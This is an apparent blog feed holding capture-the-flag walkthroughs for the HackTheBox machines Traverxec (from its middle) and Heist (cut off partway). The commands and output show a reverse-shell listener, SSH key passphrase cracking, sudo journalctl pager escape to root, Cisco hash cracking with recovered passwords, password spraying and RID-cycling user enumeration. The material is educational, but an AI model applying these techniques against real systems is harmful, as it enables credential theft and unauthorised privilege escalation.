</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.34<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.165<span class="o">]</span> <span class="m">52728</span>
</span></span></code></pre></div><h4 id="passphrase-crack">Passphrase crack</h4>
<p>The backup file contains a set of SSH keys.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «loot» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ tar -xvf backup-ssh-identity-files.tgz 
</span></span><span class="line"><span class="cl">home/david/.ssh/
</span></span><span class="line"><span class="cl">home/david/.ssh/authorized_keys
</span></span><span class="line"><span class="cl">home/david/.ssh/id_rsa
</span></span><span class="line"><span class="cl">home/david/.ssh/id_rsa.pub
</span></span></code></pre></div><p>But, it is protected with a passphrase.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «ssh-keys» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ ssh -i id_rsa david@traverxec.htb 
</span></span><span class="line"><span class="cl">Enter passphrase <span class="k">for</span> key <span class="s1">&#39;id_rsa&#39;</span>: 
</span></span><span class="line"><span class="cl">david@traverxec.htb<span class="err">&#39;</span>s password:
</span></span></code></pre></div><p>So I will convert the key to crackable format hash using <code>ssh2john</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ /usr/share/john/ssh2john.py id_rsa &gt; david_rsa.hash 
</span></span><span class="line"><span class="cl">→ kali@kali «ssh-keys» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ cat david_rsa.hash 
</span></span><span class="line"><span class="cl">id_rsa:<span class="nv">$sshng$1$16$477</span>EEFFBA56F9D283D349033D5D08C4F<span class="nv">$1200$b1ec9e1ff7de1b5f5395468c76f1d92bfdaa7f2f29c3076bf6c83be71e213e9249f186ae856a2b08de0b3c957ec1f086b6e8813df672</span>...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p><code>JtR</code>  recovers the passphrase to <code>hunter</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ ./john.exe hashes/traverxec-david-rsa.hash --wordlist<span class="o">=</span>C:/tools/rockyou.txt                    
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>SSH <span class="o">[</span>RSA/DSA/EC/OPENSSH <span class="o">(</span>SSH private keys<span class="o">)</span> 32/64<span class="o">])</span>
</span></span><span class="line"><span class="cl">Cost <span class="m">1</span> <span class="o">(</span>KDF/cipher <span class="o">[</span><span class="nv">0</span><span class="o">=</span>MD5/AES <span class="nv">1</span><span class="o">=</span>MD5/3DES <span class="nv">2</span><span class="o">=</span>Bcrypt/AES<span class="o">])</span> is <span class="m">0</span> <span class="k">for</span> all loaded hashes
</span></span><span class="line"><span class="cl">Cost <span class="m">2</span> <span class="o">(</span>iteration count<span class="o">)</span> is <span class="m">1</span> <span class="k">for</span> all loaded hashes
</span></span><span class="line"><span class="cl">Will run <span class="m">8</span> OpenMP threads
</span></span><span class="line"><span class="cl">Note: This format may emit <span class="nb">false</span> positives, so it will keep trying even after
</span></span><span class="line"><span class="cl">finding a possible candidate.
</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
</span></span><span class="line"><span class="cl">hunter           <span class="o">(</span>id_rsa<span class="o">)</span>
</span></span></code></pre></div><h4 id="ssh---david">SSH - david</h4>
<p>The key and the passphrase are work for user david.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «traverxec» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ ssh -i ssh-keys/david_rsa david@traverxec.htb
</span></span><span class="line"><span class="cl">Enter passphrase <span class="k">for</span> key <span class="s1">&#39;ssh-keys/david_rsa&#39;</span>: 
</span></span><span class="line"><span class="cl">Linux traverxec 4.19.0-6-amd64 <span class="c1">#1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64</span>
</span></span><span class="line"><span class="cl">Last login: Tue Jul <span class="m">13</span> 06:54:56 <span class="m">2021</span> from 10.10.16.7
</span></span><span class="line"><span class="cl">david@traverxec:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,109<span class="o">(</span>netdev<span class="o">)</span>
</span></span></code></pre></div><p>User flag is done here</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">david@traverxec:~$ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">60</span>
</span></span><span class="line"><span class="cl">drwx--x--x <span class="m">6</span> david david  <span class="m">4096</span> Jul <span class="m">13</span> 06:57 .
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root  root   <span class="m">4096</span> Oct <span class="m">25</span>  <span class="m">2019</span> ..
</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> david david <span class="m">18992</span> Jul <span class="m">13</span> 05:43 <span class="m">47163</span>
</span></span><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> root  root      <span class="m">9</span> Oct <span class="m">25</span>  <span class="m">2019</span> .bash_history -&gt; /dev/null
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> david david   <span class="m">220</span> Oct <span class="m">25</span>  <span class="m">2019</span> .bash_logout
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> david david  <span class="m">3544</span> Jul <span class="m">13</span> 06:57 .bashrc
</span></span><span class="line"><span class="cl">drwx------ <span class="m">2</span> david david  <span class="m">4096</span> Oct <span class="m">25</span>  <span class="m">2019</span> bin
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> david david  <span class="m">4096</span> Jul <span class="m">13</span> 06:56 .local
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> david david   <span class="m">807</span> Oct <span class="m">25</span>  <span class="m">2019</span> .profile
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> david david  <span class="m">4096</span> Oct <span class="m">25</span>  <span class="m">2019</span> public_www
</span></span><span class="line"><span class="cl">drwx------ <span class="m">2</span> david david  <span class="m">4096</span> Oct <span class="m">25</span>  <span class="m">2019</span> .ssh
</span></span><span class="line"><span class="cl">-r--r----- <span class="m">1</span> root  david    <span class="m">33</span> Oct <span class="m">25</span>  <span class="m">2019</span> user.txt
</span></span><span class="line"><span class="cl">david@traverxec:~$ cat user.txt 
</span></span><span class="line"><span class="cl">7db0...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>In david&rsquo;s home directory, there is a folder called <code>bin</code>.  Under this <code>bin</code> folder, there is a bash script.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">david@traverxec:~$ ls -l bin/
</span></span><span class="line"><span class="cl">total <span class="m">8</span>
</span></span><span class="line"><span class="cl">-r-------- <span class="m">1</span> david david <span class="m">802</span> Oct <span class="m">25</span>  <span class="m">2019</span> server-stats.head
</span></span><span class="line"><span class="cl">-rwx------ <span class="m">1</span> david david <span class="m">363</span> Oct <span class="m">25</span>  <span class="m">2019</span> server-stats.sh
</span></span></code></pre></div><p>When I run the script, I get the following results:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">david@traverxec:~/bin$ ./server-stats.sh 
</span></span><span class="line"><span class="cl">                                                                          .----.
</span></span><span class="line"><span class="cl">                                                              .---------. <span class="p">|</span> <span class="o">==</span> <span class="p">|</span>
</span></span><span class="line"><span class="cl">   Webserver Statistics and Data                              <span class="p">|</span>.-<span class="s2">&#34;&#34;&#34;&#34;&#34;-.| |----|
</span></span></span><span class="line"><span class="cl"><span class="s2">         Collection Script                                    ||       || | == |
</span></span></span><span class="line"><span class="cl"><span class="s2">          (c) David, 2019                                     ||       || |----|
</span></span></span><span class="line"><span class="cl"><span class="s2">                                                              |&#39;-.....-&#39;| |::::|
</span></span></span><span class="line"><span class="cl"><span class="s2">                                                              &#39;&#34;&#34;)---(&#34;&#34;&#39; |___.|
</span></span></span><span class="line"><span class="cl"><span class="s2">                                                             /:::::::::::\&#34;    &#34;</span>
</span></span><span class="line"><span class="cl">                                                            /:::<span class="o">=======</span>:::<span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>                                                        jgs <span class="s1">&#39;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#39;</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Load:  18:24:49 up 17:04,  <span class="m">1</span> user,  load average: 0.13, 0.04, 0.01
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">Open nhttpd sockets: <span class="m">0</span>
</span></span><span class="line"><span class="cl">Files in the docroot: <span class="m">117</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">Last <span class="m">5</span> journal log lines:
</span></span><span class="line"><span class="cl">-- Logs begin at Tue 2021-07-13 01:20:43 EDT, end at Tue 2021-07-13 18:24:49 EDT. --
</span></span><span class="line"><span class="cl">Jul <span class="m">13</span> 17:16:02 traverxec sudo<span class="o">[</span>24501<span class="o">]</span>: pam_unix<span class="o">(</span>sudo:auth<span class="o">)</span>: authentication failure<span class="p">;</span> <span class="nv">logname</span><span class="o">=</span> <span class="nv">uid</span><span class="o">=</span><span class="m">33</span> <span class="nv">euid</span><span class="o">=</span><span class="m">0</span> <span class="nv">tty</span><span class="o">=</span>/dev/pts/0 <span class="nv">ruser</span><span class="o">=</span>www-data <span class="nv">rhost</span><span class="o">=</span>  <span class="nv">user</span><span class="o">=</span>www-data
</span></span><span class="line"><span class="cl">Jul <span class="m">13</span> 17:16:04 traverxec sudo<span class="o">[</span>24501<span class="o">]</span>: pam_unix<span class="o">(</span>sudo:auth<span class="o">)</span>: conversation failed
</span></span><span class="line"><span class="cl">Jul <span class="m">13</span> 17:16:04 traverxec sudo<span class="o">[</span>24501<span class="o">]</span>: pam_unix<span class="o">(</span>sudo:auth<span class="o">)</span>: auth could not identify password <span class="k">for</span> <span class="o">[</span>www-data<span class="o">]</span>
</span></span><span class="line"><span class="cl">Jul <span class="m">13</span> 17:16:04 traverxec sudo<span class="o">[</span>24501<span class="o">]</span>: www-data : <span class="nb">command</span> not allowed <span class="p">;</span> <span class="nv">TTY</span><span class="o">=</span>pts/0 <span class="p">;</span> <span class="nv">PWD</span><span class="o">=</span>/dev/shm <span class="p">;</span> <span class="nv">USER</span><span class="o">=</span>root <span class="p">;</span> <span class="nv">COMMAND</span><span class="o">=</span>list
</span></span><span class="line"><span class="cl">Jul <span class="m">13</span> 17:16:04 traverxec nologin<span class="o">[</span>24564<span class="o">]</span>: Attempted login by UNKNOWN on UNKNOWN
</span></span></code></pre></div><h4 id="sudo-journalctl">Sudo journalctl</h4>
<p>Based on the contents of <code>server-stats.sh</code>, user <code>david</code> seems to be allowed to run <code>journalctl</code>  with sudo.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">david@traverxec:~/bin$ cat server-stats.sh 
</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">cat /home/david/bin/server-stats.head
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Load: `/usr/bin/uptime`&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34; &#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34; &#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Last 5 journal log lines:&#34;</span>
</span></span><span class="line"><span class="cl">/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service <span class="p">|</span> /usr/bin/cat 
</span></span></code></pre></div><p>But, when I run <code>/usr/bin/sudo /usr/bin/journalctl</code>, it asks for a password.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl
</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> david: 
</span></span><span class="line"><span class="cl">Sorry, try again.
</span></span></code></pre></div><p>Then, I grab this line <code>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</code> and run it. This is what I get:</p>
<p><div class="img-container"><img src="imgs/image-20210714052617836.png" alt="image-20210714052617836"  /></div>
</p>
<p>That means I can run the following command with sudo.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service 
</span></span></code></pre></div><p>According to the <a href="https://gtfobins.github.io/gtfobins/journalctl/">GTFOBins</a>, the default pager of <code>journalctl</code> is <code>less</code>. Now since it runs with root privilege, I can escape from the pager using  <code>!/bin/bash</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210714054042963.png" alt="image-20210714054042963"  /></div>
</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Heist</title>
      <link>https://fahmifj.github.io/hackthebox/heist/</link>
      <pubDate>Wed, 28 Jul 2021 04:05:19 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/heist/</guid>
      <description>Learn how RID cycling could be used for enumerating AD users</description>
      <content:encoded><![CDATA[<p>Heist features a Help Desk-like system that allows a visitor to login as guest. Guest access allows me to read the ongoing issue and obtain an attached Cisco configuration file which contains usernames and passwords. With these credentials, a RID brute-force attack is performed in order to obtain more usernames. Spraying these credentials returns an account that can be used for remote login into the system. The administrator password can be obtained from Firefox memory dump.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Password spray attack</li>
<li>Username enumeration via RPC using RID brute-force.</li>
<li>Process dump</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>CrackMapExec</li>
<li>Hashcat</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan using <code>nmap</code> discovers five open ports: an IIS Web server on port 80, MS-RPC on port 135 and port 49669, SMB on port 445, WinRM on port 5985.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «heist» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ nmap -p- -oA nmap/10-tcp-allport-heist 10.10.10.149
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-11 21:43 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.149
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.069s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65530</span> filtered ports
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE
</span></span><span class="line"><span class="cl">80/tcp    open  http
</span></span><span class="line"><span class="cl">135/tcp   open  msrpc
</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds
</span></span><span class="line"><span class="cl">5985/tcp  open  wsman
</span></span><span class="line"><span class="cl">49669/tcp open  unknown
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 148.82 seconds
</span></span><span class="line"><span class="cl">→ kali@kali «heist» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ nmap -p80,135,445,5985,49669 -sC -sV -oA nmap/10-tcp-allport-script-heist 10.10.10.149
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-11 21:46 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.149
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.061s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       VERSION
</span></span><span class="line"><span class="cl">80/tcp    open  http          Microsoft IIS httpd 10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-cookie-flags: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   /: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>     PHPSESSID: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_      httponly flag not <span class="nb">set</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-title: Support Login Page
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Requested resource was login.php
</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds?
</span></span><span class="line"><span class="cl">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
</span></span><span class="line"><span class="cl">49669/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host script results:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: 2m52s
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   2.02: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled but not required
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2021-07-12T01:50:42
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 99.94 seconds
</span></span></code></pre></div><p>I probably won&rsquo;t touch MS-RPC on port 49669, but the one on port 135 is worth checking to detect PrintNightmare (which I already did in <a href="https://fahmifj.github.io/blog/play-with-printnightmare/">this post</a>).</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>Without credentials, I can&rsquo;t do much on SMB.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «heist» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ smbclient -N -L //10.10.10.149
</span></span><span class="line"><span class="cl">session setup failed: NT_STATUS_ACCESS_DENIED
</span></span></code></pre></div><h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting the website on port 80 presented with a login page.</p>
<p><div class="img-container"><img src="imgs/image-20210712085020304.png" alt="image-20210712085020304"  /></div>
</p>
<p>No register button was found here, so I clicked the guest login and it brought me to the following page.</p>
<p><div class="img-container"><img src="imgs/image-20210712085409456.png" alt="image-20210712085409456"  /></div>
</p>
<p>From the chat above, user Hazard attached his Cisco configuration in a text file, and this config file contains several credentials.</p>
<p><div class="img-container"><img src="imgs/image-20210712085452329.png" alt="image-20210712085452329"  /></div>
</p>
<p>I know this is not my business, but it looks like this part messed up his router 😅.</p>
<p><div class="img-container"><img src="imgs/image-20210726174927930.png" alt="image-20210726174927930"  /></div>
</p>
<p>So anyway, I will grab these credentials and also I will note that hazard asked the admin to create an account for accessing the files, which probably the SMB share.</p>
<h3 id="password-crack">Password Crack</h3>
<p>The first password can be recovered with <code>hashcat</code> (identified as md5crypt).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ ./hashcat.exe -m <span class="m">500</span> hashes/heist-cisco.hash ../../rockyou.txt -O
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$1$pdQG$o8nrSzsGXeaduXrjlvKc91</span>:stealth1agent
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Session..........: hashcat
</span></span><span class="line"><span class="cl">Status...........: Cracked
</span></span><span class="line"><span class="cl">Hash.Name........: md5crypt, MD5 <span class="o">(</span>Unix<span class="o">)</span>, Cisco-IOS <span class="nv">$1</span>$ <span class="o">(</span>MD5<span class="o">)</span>
</span></span><span class="line"><span class="cl">Hash.Target......: <span class="nv">$1$pdQG$o8nrSzsGXeaduXrjlvKc91</span>
</span></span><span class="line"><span class="cl">Time.Started.....: Mon Jul <span class="m">12</span> 08:58:28 <span class="m">2021</span> <span class="o">(</span><span class="m">2</span> secs<span class="o">)</span>
</span></span><span class="line"><span class="cl">Time.Estimated...: Mon Jul <span class="m">12</span> 08:58:30 <span class="m">2021</span> <span class="o">(</span><span class="m">0</span> secs<span class="o">)</span>
</span></span><span class="line"><span class="cl">Guess.Base.......: File <span class="o">(</span>../../rockyou.txt<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>The rest of the passwords are encrypted with cisco type 7 encryption. These passwords can be decrypted using <a href="https://davidbombal.com/cisco-type-7-password-decryption/">this site</a> .</p>
<p><div class="img-container"><img src="imgs/image-20210712090727149.png" alt="image-20210712090727149"  /></div>
</p>
<p><div class="img-container"><img src="imgs/image-20210712090628350.png" alt="image-20210712090628350"  /></div>
</p>
<p>Now I have one password and two set of credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">?:$1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent
</span></span><span class="line"><span class="cl">rout3r:0242114B0E143F015F5D1E161713:$uperP@ssword
</span></span><span class="line"><span class="cl">admin:02375012182C1A1D751618034F36415408:Q4)sJu\Y8qz*A3?d
</span></span></code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="access-as-hazard">Access as Hazard</h3>
<h4 id="password-spray">Password Spray</h4>
<p>With user <code>hazard</code> included, I have three usernames and three passwords. I will use them to perform a password spray attack on SMB using <code>crackmapexec</code>. The results reveals that the password <code>stealth1agent</code>  works for user <code>hazard</code>, but it doesn&rsquo;t show &ldquo;Pwn3d!&rdquo; message, this means I have no access to WinRM.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «heist» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ crackmapexec smb 10.10.10.149 -u usernames.list -p passwords.list
</span></span><span class="line"><span class="cl">SMB         10.10.10.149    <span class="m">445</span>    SUPPORTDESK      <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:SUPPORTDESK<span class="o">)</span> <span class="o">(</span>domain:SupportDesk<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</span></span><span class="line"><span class="cl">SMB         10.10.10.149    <span class="m">445</span>    SUPPORTDESK      <span class="o">[</span>+<span class="o">]</span> SupportDesk<span class="se">\h</span>azard:stealth1agent 
</span></span></code></pre></div><p>Another spray shows that user <code>hazard</code> can login into RPC servic as well.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «heist» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ ./exploits/rpcspray.sh usernames.list passwords.list 10.10.10.149
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying user@password: hazard@stealth1agent 
</span></span><span class="line"><span class="cl">Account Name: Hazard, Authority Name: SUPPORTDESK
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying user@password: hazard@<span class="nv">$uperP</span>@ssword 
</span></span><span class="line"><span class="cl">Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying user@password: hazard@Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz*A3?d 
</span></span><span class="line"><span class="cl">Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying user@password: admin@stealth1agent 
</span></span><span class="line"><span class="cl">Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying user@password: admin@<span class="nv">$uperP</span>@ssword 
</span></span><span class="line"><span class="cl">Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying user@password: admin@Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz*A3?d 
</span></span><span class="line"><span class="cl">Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
</span></span></code></pre></div><h4 id="user-enumeration-via-rpc">User Enumeration via RPC</h4>
<p>Since the share doesn&rsquo;t contain anything juicy, the other thing I can do with user hazard is enumeration on RPC.</p>
<p>Within <code>rpcclient</code> shell, <code>enumdomusers</code> is typically used to enumerate domain users, but it doesn&rsquo;t work here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «heist» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ rpcclient -U <span class="s1">&#39;hazard%stealth1agent&#39;</span> 10.10.10.149                   
</span></span><span class="line"><span class="cl">rpcclient $&gt; srvinfo
</span></span><span class="line"><span class="cl">        10.10.10.149   Wk Sv NT SNT         
</span></span><span class="line"><span class="cl">        platform_id     :       <span class="m">500</span>
</span></span><span class="line"><span class="cl">        os version      :       10.0
</span></span><span class="line"><span class="cl">        server <span class="nb">type</span>     :       0x9003
</span></span><span class="line"><span class="cl">rpcclient $&gt; enumdomusers
</span></span><span class="line"><span class="cl">result was NT_STATUS_CONNECTION_DISCONNECTED
</span></span></code></pre></div><p>Based on the result, the problem here was not the user&rsquo;s permissions. But, fortunately, the  <code>lookupnames</code>  command can be used to retrieve user&rsquo;s <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/security-identifiers-in-windows">SID</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">rpcclient $&gt; lookupnames hazard
</span></span><span class="line"><span class="cl">hazard S-1-5-21-4254423774-1266059056-3197185112-1008 <span class="o">(</span>User: 1<span class="o">)</span>
</span></span></code></pre></div><p>Reverse lookups (SID to username) also works here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">rpcclient $&gt; lookupsids S-1-5-21-4254423774-1266059056-3197185112-1008
</span></span><span class="line"><span class="cl">S-1-5-21-4254423774-1266059056-3197185112-1008 SUPPORTDESK<span class="se">\H</span>azard <span class="o">(</span>1<span class="o">)</span>
</span></span></code></pre></div><p>In Windows system, excluding the RID section, this value <code>S-1-5-21-4254423774-1266059056-3197185112-[RID]</code>  is likely to be unique and is fixed for each computer domain. A normal user RID usually starts from 1000, and with this, I can enumerate the available users by incrementing the number.</p>
<p>The enumeration can be scripted using bash, and I&rsquo;ve created one to enumerate the first 20 users.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
